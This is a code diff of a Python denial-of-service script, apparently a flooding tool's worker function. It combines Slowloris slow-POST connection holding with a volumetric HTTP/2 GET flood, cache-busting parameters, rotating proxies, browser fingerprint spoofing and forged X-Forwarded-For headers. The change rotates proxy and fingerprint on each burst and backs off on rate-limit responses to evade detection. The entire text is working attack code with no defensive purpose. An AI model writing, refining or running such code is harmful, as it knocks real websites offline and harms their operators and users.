@@ -681,87 +681,83 @@ async def main_loop():
 		logging.info("Tasks successfully cancelled.")
 
 async def WorkerTask(counter, semaphore):
-	# Choose a random browser to impersonate to avoid fingerprinting
 	impersonate_targets = ["chrome110", "chrome116", "edge101", "safari15_3"]
-	browser = random.choice(impersonate_targets)
-	
-	# Determine proxy
-	proxy_url = None
-	if choice2 == "y":
-		if counter - 1 < len(proxies):
-			raw_proxy = proxies[counter-1].strip()
-		else:
-			raw_proxy = random.choice(proxies).strip()
-		
-		if choice3 == "0":
-			proxy_url = f"http://{raw_proxy}"
-		elif choice3 == "1":
-			proxy_url = f"socks5://{raw_proxy}"
-
-	# Fallback headers for extra randomness (optional, impersonate handles most)
-	randomip = f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
-	extra_headers = {
-		"User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.3{random.randint(0, 9)}",
-		"X-Forwarded-For": randomip,
-		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-		"Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
-		"Sec-Ch-Ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
-		"Sec-Ch-Ua-Mobile": "?0",
-		"Sec-Ch-Ua-Platform": "\"Windows\"",
-		"Sec-Fetch-Dest": "document",
-		"Sec-Fetch-Mode": "navigate",
-		"Sec-Fetch-Site": "none",
-		"Sec-Fetch-User": "?1",
-		"Upgrade-Insecure-Requests": "1", # Matches the target's CSP policy requirements
-		"Connection": "keep-alive" # Necessary for connection persistence vs their strict CORS
-	}
-
-	# 10% of threads will be dedicated to Slowloris connection holding, 90% for Volumetric Flood
-	is_slowloris = random.random() < 0.10
 
 	try:
 		async with semaphore:
-			# AsyncSession with HTTP/2 support and JA3 spoofing
-			async with AsyncSession(impersonate=browser, proxy=proxy_url, verify=False) as session:
-				while True:
-					if is_slowloris:
-						# SLOWLORIS MODE: Slow POST Request
-						target = "http://" + random.choice(ips).strip() if choice1 == "1" else url
-						target_with_buster = f"{target}?_cb={random.randint(100000, 99999999)}"
-						logging.debug(f"[SLOW] Sending Slowloris POST from Thread {counter} (Browser: {browser})")
-						try:
-							# Устанавливаем огромный таймаут, так как мы сами тормозим отправку
+			while True:
+				browser = random.choice(impersonate_targets)
+				# Determine new proxy for every attack burst
+				proxy_url = None
+				if choice2 == "y":
+					raw_proxy = random.choice(proxies).strip()
+					if choice3 == "0":
+						proxy_url = f"http://{raw_proxy}"
+					elif choice3 == "1":
+						proxy_url = f"socks5://{raw_proxy}"
+
+				randomip = f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+				extra_headers = {
+					"User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.3{random.randint(0, 9)}",
+					"X-Forwarded-For": randomip,
+					"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+					"Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
+					"Sec-Ch-Ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
+					"Sec-Ch-Ua-Mobile": "?0",
+					"Sec-Ch-Ua-Platform": "\"Windows\"",
+					"Sec-Fetch-Dest": "document",
+					"Sec-Fetch-Mode": "navigate",
+					"Sec-Fetch-Site": "none",
+					"Sec-Fetch-User": "?1",
+					"Upgrade-Insecure-Requests": "1", 
+					"Connection": "keep-alive" 
+				}
+
+				is_slowloris = random.random() < 0.10
+
+				# Open a fresh HTTP/2 Session with a NEW proxy/fingerprint
+				try:
+					async with AsyncSession(impersonate=browser, proxy=proxy_url, verify=False) as session:
+						if is_slowloris:
+							target = "http://" + random.choice(ips).strip() if choice1 == "1" else url
+							target_with_buster = f"{target}?_cb={random.randint(100000, 99999999)}"
 							response = await session.post(
 								target_with_buster, 
 								headers=extra_headers, 
 								data=slow_payload_generator(), 
-								timeout=1000.0 # Timeout needs to be large enough for the generator to run
+								timeout=1000.0 
 							)
 							logging.info(f"[SLOW] Thread {counter} | Status: {response.status_code}")
-						except asyncio.CancelledError:
-							raise
-						except Exception as e:
-							logging.debug(f"[SLOW] Thread {counter} Error: {type(e).__name__}")
-					else:
-						# VOLUMETRIC MODE: Fast GET Flood (HTTP/2 Multiplexing)
-						async def make_request():
-							try:
-								target = "http://" + random.choice(ips).strip() if choice1 == "1" else url
-								target_with_buster = f"{target}?_cb={random.randint(100000, 99999999)}"
-								response = await session.get(target_with_buster, headers=extra_headers, timeout=10.0)
-								# Log only 2% of successful requests so console output doesn't bottleneck the script
-								if random.random() < 0.02 or response.status_code >= 400:
-									logging.info(f"[FAST] Thread {counter} | Status: {response.status_code}")
-							except asyncio.CancelledError:
-								raise
-							except Exception as e:
-								logging.debug(f"[FAST] Thread {counter} Error: {type(e).__name__}")
-								
-						# Blast everything concurrently over the same HTTP/2 session
-						req_tasks = [make_request() for _ in range(multiple)]
-						await asyncio.gather(*req_tasks)
+						else:
+							has_429 = False
+							async def make_request():
+								nonlocal has_429
+								if has_429: return
+								try:
+									target = "http://" + random.choice(ips).strip() if choice1 == "1" else url
+									target_with_buster = f"{target}?_cb={random.randint(100000, 99999999)}"
+									response = await session.get(target_with_buster, headers=extra_headers, timeout=10.0)
+									if response.status_code == 429:
+										has_429 = True # Stop other concurrent requests in this burst
+									if random.random() < 0.02 or response.status_code >= 400:
+										logging.info(f"[FAST] Burst {counter} | Status: {response.status_code}")
+								except asyncio.CancelledError:
+									raise
+								except Exception:
+									pass
+									
+							# Burst a finite number of requests then CLOSE the connection and change proxy
+							req_tasks = [make_request() for _ in range(multiple)]
+							await asyncio.gather(*req_tasks)
+				except asyncio.CancelledError:
+					raise
+				except Exception:
+					pass
+				
+				# Very tiny sleep to yield context
+				await asyncio.sleep(0.01)
 	except asyncio.CancelledError:
-		pass # Exit gracefully on Ctrl+C
+		pass
 	except Exception:
 		pass
 
